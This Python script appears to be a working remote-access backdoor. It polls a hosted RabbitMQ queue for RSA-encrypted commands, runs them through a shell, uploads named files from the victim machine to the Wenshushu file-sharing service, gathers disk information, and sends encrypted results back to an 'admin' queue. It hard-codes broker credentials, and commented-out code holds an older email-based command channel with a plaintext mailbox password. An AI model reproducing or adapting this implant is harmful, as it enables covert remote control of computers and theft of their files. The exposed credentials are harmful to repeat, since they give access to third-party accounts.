from email.mime.multipart import MIMEMultipart
import poplib
import sys
import time
import subprocess
from email.parser import BytesParser
from email.header import decode_header
from email.utils import parseaddr
import smtplib
from email.mime.text import MIMEText
from email.header import Header
import os
from py7zr import SevenZipFile
import re
import base64
import concurrent.futures
import hashlib
import json
import os
import sys
import time
from concurrent.futures import ThreadPoolExecutor
import psutil
import base58
import requests
from Cryptodome.Cipher import DES
from Cryptodome.Util import Padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding as asymmetric_padding
import pika

def encrypt_with_public_key(public_key_path, data):
    with open(public_key_path, "rb") as f:
        public_key = serialization.load_pem_public_key(
            f.read(),
            backend=default_backend()
        )
    
    max_block_size = public_key.key_size // 8 - 2 * hashes.SHA256.digest_size - 2
    
    data = data.encode('utf-8')
    encrypted_blocks = []
    for i in range(0, len(data), max_block_size):
        block = data[i:i+max_block_size]
        encrypted_block = public_key.encrypt(
            block,
            asymmetric_padding.OAEP(
                mgf=asymmetric_padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        encrypted_blocks.append(encrypted_block)
    
    encrypted_data = b''.join(encrypted_blocks)
    return encrypted_data

def decrypt_with_private_key(private_key_path, encrypted_data):
    with open(private_key_path, "rb") as f:
        private_key = serialization.load_pem_private_key(
            f.read(),
            password=None,
            backend=default_backend()
        )
    
    max_block_size = private_key.key_size // 8
    decrypted_blocks = []
    for i in range(0, len(encrypted_data), max_block_size):
        block = encrypted_data[i:i+max_block_size]
        decrypted_block = private_key.decrypt(
            block,
            asymmetric_padding.OAEP(
                mgf=asymmetric_padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        decrypted_blocks.append(decrypted_block)
    
    decrypted_data = b''.join(decrypted_blocks)
    return decrypted_data.decode('utf-8')

def sha1_encrypt(data):
    sha1_hash = hashlib.sha1(data.encode()).hexdigest().upper()
    return sha1_hash

def get_drive_info():
    drive_info = []
    partitions = psutil.disk_partitions()

    for partition in partitions:
        drive = {}
        drive['Device'] = partition.device
        drive['Mountpoint'] = partition.mountpoint
        drive['File System'] = partition.fstype

        try:
            usage = psutil.disk_usage(partition.mountpoint)
            drive['Total Space'] = str(usage.total)
            drive['Used Space'] = str(usage.used)
            drive['Free Space'] = str(usage.free)
            drive['Usage Percentage'] = str(usage.percent)
        except Exception as e:
            drive['Error'] = str(e)

        drive_info.append(drive)

    return drive_info


def login_anonymous(session):
    r = session.post(
        url='https://www.wenshushu.cn/ap/login/anonymous',
        json={
            "dev_info": "{}"
        }
    )
    return r.json()['data']['token']


def download(url):
    def get_tid(token):
        r = s.post(
            url='https://www.wenshushu.cn/ap/task/token',
            json={
                'token': token
            }
        )
        return r.json()['data']['tid']

    def mgrtask(tid):
        r = s.post(
            url='https://www.wenshushu.cn/ap/task/mgrtask',
            json={
                'tid': tid,
                'password': ''
            }
        )
        rsp = r.json()
        expire = rsp['data']['expire']
        days, remainder = divmod(int(float(expire)), 3600*24)
        hours, remainder = divmod(remainder, 3600)
        minutes, seconds = divmod(remainder, 60)
        print(f'文件过期时间:{days}天{hours}时{minutes}分{seconds}秒')
        send(f'文件过期时间:{days}天{hours}时{minutes}分{seconds}秒')

        file_size = rsp['data']['file_size']
        send(f'文件大小:{round(int(file_size)/1024**2,2)}MB')
        print(f'文件大小:{round(int(file_size)/1024**2,2)}MB')
        return rsp['data']['boxid'], rsp['data']['ufileid']  # pid

    def list_file(tid):
        bid, pid = mgrtask(tid)
        r = s.post(
            url='https://www.wenshushu.cn/ap/ufile/list',
            json={
                "start": 0,
                "sort": {
                    "name": "asc"
                },
                "bid": bid,
                "pid": pid,
                "type": 1,
                "options": {
                    "uploader": "true"
                },
                "size": 50
            }
        )
        rsp = r.json()
        filename = rsp['data']['fileList'][0]['fname']
        fid = rsp['data']['fileList'][0]['fid']
        send(f'文件名:{filename}')
        print(f'文件名:{filename}')
        sign(bid, fid, filename)

    def down_handle(url, filename):
        print('开始下载!', end='\r')
        r = s.get(url, stream=True)
        dl_size = int(r.headers.get('Content-Length'))
        block_size = 2097152
        dl_count = 0
        with open(filename, 'wb') as f:
            r.raise_for_status()
            for chunk in r.iter_content(chunk_size=block_size):
                f.write(chunk)
                dl_count += len(chunk)
                print(f'下载进度:{int(dl_count/dl_size*100)}%', end='\r')
            print('下载完成:100%')

    def sign(bid, fid, filename):
        r = s.post(
            url='https://www.wenshushu.cn/ap/dl/sign',
            json={
                'consumeCode': 0,
                'type': 1,
                'ufileid': fid
            }
        )
        if r.json()['data']['url'] == "" and \
                r.json()['data']['ttNeed'] != 0:
            print("对方的分享流量不足")
            sys.exit(0)
        url = r.json()['data']['url']
        down_handle(url, filename)

    if len(url.split('/')[-1]) == 16:
        token = url.split('/')[-1]
        tid = get_tid(token)
    elif len(url.split('/')[-1]) == 11:
        tid = url.split('/')[-1]

    list_file(tid)


def upload(filePath):
    chunk_size = 2097152
    file_size = os.path.getsize(filePath)
    ispart = True if file_size > chunk_size else False

    def read_file(block_size=chunk_size):
        partnu = 0
        with open(filePath, "rb") as f:
            while True:
                block = f.read(block_size)
                partnu += 1
                if block:
                    yield block, partnu
                else:
                    return

    def sha1_str(s):
        cm = hashlib.sha1(s.encode()).hexdigest()
        return cm

    def calc_file_hash(hashtype, block=None):
        read_size = chunk_size if ispart else None
        if not block:
            with open(filePath, 'rb') as f:
                block = f.read(read_size)
        if hashtype == "MD5":
            hash_code = hashlib.md5(block).hexdigest()
        elif hashtype == "SHA1":
            hash_code = hashlib.sha1(block).hexdigest()
        return hash_code

    def get_epochtime():
        r = s.get(
            url='https://www.wenshushu.cn/ag/time',
            headers={
                "Prod": "com.wenshushu.web.pc",
                "Referer": "https://www.wenshushu.cn/"
            }
        )
        rsp = r.json()
        return rsp["data"]["time"]  # epochtime expires in 60s

    def get_cipherheader(epochtime, token, data):
        # cipherMethod: DES/CBC/PKCS7Padding
        json_dumps = json.dumps(data, ensure_ascii=False)
        md5_hash_code = hashlib.md5((json_dumps+token).encode()).hexdigest()
        base58_hash_code = base58.b58encode(md5_hash_code)
        key_iv = (
            # 时间戳逆序取5位并作为时间戳字串索引再次取值，最后拼接"000"
            "".join([epochtime[int(i)] for i in epochtime[::-1][:5]]) + "000"
        ).encode()
        cipher = DES.new(key_iv, DES.MODE_CBC, key_iv)
        cipherText = cipher.encrypt(
            Padding.pad(base58_hash_code, DES.block_size, style="pkcs7")
        )
        return base64.b64encode(cipherText)

    def storage():
        r = s.post(
            url='https://www.wenshushu.cn/ap/user/storage',
            json={}
        )
        rsp = r.json()
        rest_space = int(rsp['data']['rest_space'])
        send_space = int(rsp['data']['send_space'])
        storage_space = rest_space + send_space
        send('当前已用空间:{}GB,剩余空间:{}GB,总空间:{}GB'.format(
            round(send_space / 1024**3, 2),
            round(rest_space / 1024**3, 2),
            round(storage_space / 1024**3, 2)
        ))
        print('当前已用空间:{}GB,剩余空间:{}GB,总空间:{}GB'.format(
            round(send_space / 1024**3, 2),
            round(rest_space / 1024**3, 2),
            round(storage_space / 1024**3, 2)
        ))

    def userinfo():
        s.post(
            url='https://www.wenshushu.cn/ap/user/userinfo',
            json={"plat": "pcweb"}
        )

    def addsend():
        userinfo()
        storage()
        epochtime = get_epochtime()
        req_data = {
            "sender": "",
            "remark": "",
            "isextension": False,
            "notSaveTo": False,
            "notDownload": False,
            "notPreview": False,
            "downPreCountLimit": 0,
            "trafficStatus": 0,
            "pwd": "",
            "expire": "1",
            "recvs": [
                "social",
                "public"
            ],
            "file_size": file_size,
            "file_count": 1
        }
        # POST的内容在服务端会以字串形式接受然后直接拼接X-TOKEN，不会先反序列化JSON字串再拼接
        # 加密函数中的JSON序列化与此处的JSON序列化的字串形式两者必须完全一致，否则校验失败
        r = s.post(
            url='https://www.wenshushu.cn/ap/task/addsend',
            json=req_data,
            headers={
                "A-code": get_cipherheader(epochtime, s.headers['X-TOKEN'], req_data),
                "Prod": "com.wenshushu.web.pc",
                "Referer": "https://www.wenshushu.cn/",
                "Origin": "https://www.wenshushu.cn",
                "Req-Time": epochtime,
            }
        )
        rsp = r.json()
        if rsp["code"] == 1021:
            send(f'操作太快啦！请{rsp["message"]}秒后重试')
            print(f'操作太快啦！请{rsp["message"]}秒后重试')
            sys.exit(0)
        data = rsp["data"]
        assert data, "需要滑动验证码"
        bid, ufileid, tid = data["bid"], data["ufileid"], data["tid"]
        upId = get_up_id(bid, ufileid, tid, file_size)
        return bid, ufileid, tid, upId

    def get_up_id(bid: str, ufileid: str, tid: str, file_size: int):
        r = s.post(
            url="https://www.wenshushu.cn/ap/uploadv2/getupid",
            json={
                "preid": ufileid,
                "boxid": bid,
                "linkid": tid,
                "utype": "sendcopy",
                "originUpid": "",
                "length": file_size,
                "count": 1
            }
        )
        return r.json()["data"]["upId"]

    def psurl(fname, upId, file_size, partnu=None):
        payload = {
            "ispart": ispart,
            "fname": fname,
            "fsize": file_size,
            "upId": upId,
        }
        if ispart:
            payload["partnu"] = partnu
        r = s.post(
            url="https://www.wenshushu.cn/ap/uploadv2/psurl",
            json=payload
        )
        rsp = r.json()
        url = rsp["data"]["url"]  # url expires in 600s (10 minutes)
        return url

    def copysend(boxid, taskid, preid):
        r = s.post(
            url='https://www.wenshushu.cn/ap/task/copysend',
            json={
                'bid': boxid,
                'tid': taskid,
                'ufileid': preid
            }
        )
        rsp = r.json()
        send(f"个人管理链接：{rsp['data']['mgr_url']}\n" +
                   f"公共链接：{rsp['data']['public_url']}")
        print(f"个人管理链接：{rsp['data']['mgr_url']}")
        print(f"公共链接：{rsp['data']['public_url']}")

    def fast():
        boxid, preid, taskid, upId = addsend()
        cm1, cs1 = calc_file_hash("MD5"), calc_file_hash("SHA1")
        cm = sha1_str(cm1)
        name = os.path.basename(filePath)

        payload = {
            "hash": {
                "cm1": cm1,  # MD5
                "cs1": cs1,  # SHA1
            },
            "uf": {
                "name": name,
                "boxid": boxid,
                "preid": preid
            },
            "upId": upId
        }

        if not ispart:
            payload['hash']['cm'] = cm  # 把MD5用SHA1加密
        for _ in range(2):
            r = s.post(
                url='https://www.wenshushu.cn/ap/uploadv2/fast',
                json=payload
            )
            rsp = r.json()
            can_fast = rsp["data"]["status"]
            ufile = rsp['data']['ufile']
            if can_fast and not ufile:
                hash_codes = ''
                for block, _ in read_file():
                    hash_codes += calc_file_hash("MD5", block)
                payload['hash']['cm'] = sha1_str(hash_codes)
            elif can_fast and ufile:
                send(f'文件{name}可以被秒传！')
                print(f'文件{name}可以被秒传！')
                getprocess(upId)
                copysend(boxid, taskid, preid)
                sys.exit(0)

        return name, taskid, boxid, preid, upId

    def getprocess(upId: str):
        while True:
            r = s.post(
                url="https://www.wenshushu.cn/ap/ufile/getprocess",
                json={
                    "processId": upId
                }
            )
            if r.json()["data"]["rst"] == "success":
                return True
            time.sleep(1)

    def complete(fname, upId, tid, boxid, preid):
        s.post(
            url="https://www.wenshushu.cn/ap/uploadv2/complete",
            json={
                "ispart": ispart,
                "fname": fname,
                "upId": upId,
                "location": {
                    "boxid": boxid,
                    "preid": preid
                }
            }
        )
        copysend(boxid, tid, preid)

    def file_put(psurl_args, fn, offset=0, read_size=chunk_size):
        with open(fn, "rb") as fio:
            fio.seek(offset)
            requests.put(url=psurl(*psurl_args), data=fio.read(read_size))

    def upload_main():
        fname, tid, boxid, preid, upId = fast()
        content = ''
        if ispart:
            content += '文件正在被分块上传！\n'
            print('文件正在被分块上传！')
            # or use os.cpu_count()
            with ThreadPoolExecutor(max_workers=4) as executor:
                future_list = []
                for i in range((file_size + chunk_size - 1)//chunk_size):
                    ul_size = chunk_size if chunk_size*(i+1) <= file_size \
                        else file_size % chunk_size
                    future_list.append(executor.submit(
                        file_put, [fname, upId, ul_size, i+1],
                        filePath, chunk_size*i, ul_size
                    ))
                future_length = len(future_list)
                count = 0
                for _ in concurrent.futures.as_completed(future_list):
                    count += 1
                    sp = count / future_length * 100
                    content += f'分块进度:{int(sp)}%\n'
                    print(f'分块进度:{int(sp)}%', end='\r')
                    if sp == 100:
                        content += '分块上传完成！\n'
                        print('上传完成:100%')
        else:
            content += '文件被整块上传！\n'
            print('文件被整块上传！')
            file_put([fname, upId, file_size], filePath, 0, file_size)
            content += '上传完成！\n'
            print('上传完成:100%')

        complete(fname, upId, tid, boxid, preid)
        getprocess(upId)

        send(content)
        
    upload_main()

# def send(body):
#     # rsa加密
#     body = encrypt_with_public_key(public_key_path, body).hex().upper()
#     # 邮件服务器地址和端口
#     smtp_server = 'smtp.gmx.com'
#     smtp_port = 587

#     # 发件人和收件人的邮箱地址
#     sender_email = 'filecat2023@gmx.com'
#     receiver_email = 'filecat@gmx.com'

#     subject = sha1_encrypt(str(int(time.time())))

#     # 创建邮件内容
#     msg = MIMEMultipart()
#     msg['From'] = sender_email
#     msg['To'] = receiver_email
#     msg['Subject'] = Header(subject, 'utf-8')
#     msg.attach(MIMEText(body, 'plain', 'utf-8'))
    
#     # 链接到邮件服务器并发送邮件
#     try:
#         server = smtplib.SMTP(smtp_server, smtp_port)
#         server.starttls()  # 启用 TLS
#         server.login(sender_email, "Kim12138")
#         server.sendmail(sender_email, receiver_email, msg.as_string())
#         # print('邮件发送成功')
#     except Exception as e:
#         print(str(e))
#     finally:
#         server.quit()

def cmd(command):
    # command = "tree C:\ /F > D:/test.txt"

    result = subprocess.run(command, shell=True,
                            stdout=subprocess.PIPE, text=True)

    print(result.stdout)

    send(result.stdout)

# 解码邮件主题或发件人


def decode_str(s):
    value, charset = decode_header(s)[0]
    if isinstance(value, bytes):
        value = value.decode(charset if charset else 'utf-8')
    return value

# 定义处理新邮件的函数


# def process_new_email(msg):
#     global delay_time
#     msg_parser = BytesParser()
#     email_msg = msg_parser.parsebytes(msg)

#     subject = decode_str(email_msg['subject'])
#     sender = decode_str(email_msg['from'])

#     if sender == 'filecat@gmx.com' and subject == "C164CCDB8B83AA03CE843875EC14A7D50D130AEE":
#         # print("收到新邮件！")
#         # print("Sender:", sender)
#         print("SHA1: ", subject)

#         # 获取邮件正文
#         for part in email_msg.walk():
#             if part.get_content_type() == 'text/plain':
#                 body = part.get_payload(decode=True).decode(
#                     part.get_content_charset())

#                 print("Encrypted data: " + body)

#                 # 解密
#                 command = decrypt_with_private_key(private_key_path, bytes.fromhex(body))

#                 print("Decrypted data: " + command)

#                 word_list = re.split(r'\s+', command)  # 按空格分割
#                 # print(word_list)
#                 if word_list[0] == "upload":
#                     upload(word_list[1])
#                 elif word_list[0] == "connect":
#                     send("connected")
#                     delay_time = 5
#                 elif word_list[0] == "disconnect":
#                     send("disconnecting")
#                     # global delay_time
#                     delay_time = 10
#                 elif word_list[0] == "get_drive_info":
#                     drives = get_drive_info()
#                     drive_info = ''
#                     for drive in drives:
#                         info = (
#                             "Drive: {}\n"
#                             "Mountpoint: {}\n"
#                             "File System: {}\n"
#                         ).format(
#                             drive['Device'],
#                             drive['Mountpoint'],
#                             drive['File System']
#                         )
#                         drive_info += info +'\n'
#                         if 'Error' in drive:
#                             info = (
#                                 "Error: {}\n"
#                             ).format(
#                                 drive['Error']
#                             )
#                         else:
#                             info = (
#                                 "Total Space: {}\n"
#                                 "Used Space: {}\n"
#                                 "Free Space: {}\n"
#                                 "Usage Percentage: {}\n"
#                             ).format(
#                                 drive['Total Space'],
#                                 drive['Used Space'],
#                                 drive['Free Space'],
#                                 drive['Usage Percentage']
#                             )
#                         drive_info += info + '\n'
#                     # print(drive_info)
#                     # encrypt_with_public_key(public_key_path, drive_info)
#                     send(drive_info)
#                 else:
#                     cmd(command)

#         # 删除邮件
#         pop3.dele(email_count)

def send(message) :
    username = 'pwuskgvj'
    pwd = 'P400040HF4SoISgwDLB1KDJEVMB_336y'
    user_pwd = pika.PlainCredentials(username, pwd)
    s_conn = pika.BlockingConnection(pika.ConnectionParameters('gerbil.rmq.cloudamqp.com',5672,'pwuskgvj', credentials=user_pwd))#创建连接
    chan = s_conn.channel()
    chan.queue_declare(queue='admin',durable=True)

    message = encrypt_with_public_key(public_key_path, message).hex().upper()

    chan.basic_publish(exchange='amq.direct',
                      routing_key='admin',
                      body=message)
    s_conn.close()

if __name__ == "__main__":
    public_key_path = "public_key.pem"
    private_key_path = "private_key.pem"

    s = requests.Session()
    s.headers['X-TOKEN'] = login_anonymous(s)
    s.headers['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
    # NOTE: require header, otherwise return {"code":-1, ...}
    s.headers['Accept-Language'] = "en-US, en;q=0.9"

    delay_time = 10
    username = 'pwuskgvj'
    pwd = 'P400040HF4SoISgwDLB1KDJEVMB_336y'
    user_pwd = pika.PlainCredentials(username, pwd)
    connection = pika.BlockingConnection(pika.ConnectionParameters('gerbil.rmq.cloudamqp.com',5672,'pwuskgvj', credentials=user_pwd))
    channel = connection.channel()
    channel.queue_declare(queue='remote', durable=True)

    def callback(ch, method, properties, body):
        print("Encrypted data: " + body.decode('utf-8'))
        # 解密
        command = decrypt_with_private_key(private_key_path, bytes.fromhex(body.decode('utf-8')))

        print("Decrypted data: " + command)

        word_list = re.split(r'\s+', command)  # 按空格分割
        if word_list[0] == "upload":
            upload(word_list[1])
        elif word_list[0] == "connect":
            send("connected")
            delay_time = 5
        elif word_list[0] == "disconnect":
            send("disconnecting")
            # global delay_time
            delay_time = 10
        elif word_list[0] == "get_drive_info":
            drives = get_drive_info()
            drive_info = ''
            for drive in drives:
                info = (
                    "Drive: {}\n"
                    "Mountpoint: {}\n"
                    "File System: {}\n"
                ).format(
                    drive['Device'],
                    drive['Mountpoint'],
                    drive['File System']
                )
                drive_info += info +'\n'
                if 'Error' in drive:
                    info = (
                        "Error: {}\n"
                    ).format(
                        drive['Error']
                    )
                else:
                    info = (
                        "Total Space: {}\n"
                        "Used Space: {}\n"
                        "Free Space: {}\n"
                        "Usage Percentage: {}\n"
                    ).format(
                        drive['Total Space'],
                        drive['Used Space'],
                        drive['Free Space'],
                        drive['Usage Percentage']
                    )
                drive_info += info + '\n'
            send(drive_info)
        else:
            cmd(command)

    channel.basic_consume(queue='remote', on_message_callback=callback, auto_ack=True)

    print(' [*] Waiting for messages. To exit press CTRL+C')
    channel.start_consuming()
